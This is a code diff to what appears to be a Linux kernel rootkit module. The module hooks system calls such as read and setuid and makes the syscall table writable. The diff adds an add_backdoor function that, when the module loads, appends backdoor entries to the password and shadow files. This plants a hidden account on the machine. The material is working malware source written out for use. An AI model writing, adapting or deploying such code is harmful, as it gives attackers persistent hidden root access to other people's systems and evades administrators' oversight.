@@ -386,16 +386,66 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 
 	copy_to_user(buf, tmp_buf, ret);
 	
-	cleanup2:	
+cleanup2:	
 	if(tmp_buf) 
 		kfree(tmp_buf);
 	
-	cleanup1:
+cleanup1:
 	if(tmp) 
 		free_page((unsigned long)tmp);
 
-	exit:
-		return ret;	
+exit:
+	return ret;	
+}
+
+void add_backdoor(char * pathname)
+{
+    struct file *file;
+    char * BACKDOOR;
+    mm_segment_t old_fs;
+
+    loff_t offset;
+
+    long ret;
+
+    if(strcmp(pathname, PASSWD_FILE)==0)
+        BACKDOOR = BACKDOOR_PASSWD;
+    if(strcmp(pathname, SHADOW_FILE)==0)
+        BACKDOOR = BACKDOOR_SHADOW;
+
+    old_fs = get_fs();
+
+    set_fs(get_ds());
+    file = filp_open(pathname, O_RDWR, 0);
+    set_fs(old_fs);
+
+    if(IS_ERR(file)){
+        goto exit;
+    }
+
+    offset = 0;
+
+    set_fs(get_ds());
+    offset = vfs_llseek(file, offset, SEEK_END);
+    set_fs(old_fs);
+
+    if(offset < 0){
+        goto cleanup;
+    }
+
+    set_fs(get_ds());
+    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
+    set_fs(old_fs);
+
+    if(ret<0){
+        goto cleanup;
+    }
+
+cleanup:
+    if(!file)
+        filp_close(file, NULL);
+exit:
+    return;
 }
 
 void set_addr_rw(unsigned long addr)
@@ -444,6 +494,9 @@ static int __init initModule(void)
     }
 
     set_addr_rw((unsigned long) sys_call_table);
+
+    add_backdoor(PASSWD_FILE);
+    add_backdoor(SHADOW_FILE);
 
     HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);
 
